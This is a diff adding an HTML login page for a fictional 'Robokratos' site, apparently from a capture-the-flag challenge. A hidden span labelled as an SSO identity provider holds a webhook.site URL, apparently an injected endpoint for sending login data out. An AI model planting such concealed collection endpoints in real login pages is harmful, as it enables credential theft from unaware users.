@@ -1,0 +1,86 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<title>Robokratos - Login</title>
+	<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="description" content="Robokratos Entreprise web site">
+<meta name="author" content="CTF core Team">
+
+<link rel="icon" href="https://kratos.robokracy.com/img/favicon.ico" />
+
+<!-- Fonts -->
+<style>
+@import url('https://fonts.googleapis.com/css?family=Black+Ops+One|Roboto+Slab&display=swap');
+</style>
+
+<!-- Bootstrap core CSS -->
+<link href="https://kratos.robokracy.com/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Custom styles -->
+<link href="https://kratos.robokracy.com/css/styles.css" rel="stylesheet">
+
+<!-- Font Awesome icons -->
+<link href="https://kratos.robokracy.com/css/fontawesome.css" rel="stylesheet"></head>
+
+<body>
+    <nav class="navbar fixed-top navbar-expand-lg navbar-dark fixed-top">
+    <div class="container">
+        <a class="navbar-brand" href="index.php">
+            <img src="https://kratos.robokracy.com/img/logo.png" alt="Logo"/> 
+            ROBOKRATOS
+        </a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+            data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+            aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                                        <li class="nav-item account active">
+                            <a class="nav-link" href="https://kratos.robokracy.com/login.php">Login<i class="fas fa-id-badge"></i></a>
+                        </li>
+                                        
+            </ul>
+        </div>
+    </div>
+</nav>
+	<div class="wrapper fadeInDown">
+        <div id="loginForm">
+
+            <!-- Icon -->
+            <i class="head-icon fas fa-shield-alt"></i>
+            <h2>Login to your account</h2>
+
+            
+            <!-- Login Form -->
+            <form action="https://kratos.robokracy.com/login.php" method="POST">
+                <input type="text" id="login" class="form-control form-control-lg" autocomplete="disabled" value="" name="login" placeholder="Login or Email">
+                <input type="password" id="password" autocomplete="disabled" value="" class="form-control form-control-lg" name="password" placeholder="Password">
+                <input type="submit" class="btn btn-primary btn-lg" value="Log In">
+            </form>
+
+            <!-- Registration page -->
+            <div id="loginFooter">
+                <a href="https://kratos.robokracy.com/password_forgotten.php"><i class="fa fa-question-circle"></i> Forgot your password ?</a>
+                <hr/>
+                <span id="sso-idp" class="d-none">	https://webhook.site/086d9207-b7cc-45aa-b17d-fae9ee4314df?</span>
+                <a href="https://kratos.robokracy.com/register.php"><i class="fa fa-book-reader"></i> Register with Token</a>
+            </div>
+        </div>
+    </div>
+
+    <footer class="py-5 bg-dark">
+    <div class="container">
+        <p class="m-0 text-center text-white">Copyright <img src="https://kratos.robokracy.com/img/footer.png"/> <b>Robokratos</b> 2020</p>
+    </div>
+    <!-- /.container -->
+</footer>
+
+<script src="https://kratos.robokracy.com/js/jquery.min.js"></script>
+<script src="https://kratos.robokracy.com/js/bootstrap.min.js"></script>    <script src="https://kratos.robokracy.com/js/sso_login.js"></script>
+</body>
+
+</html>
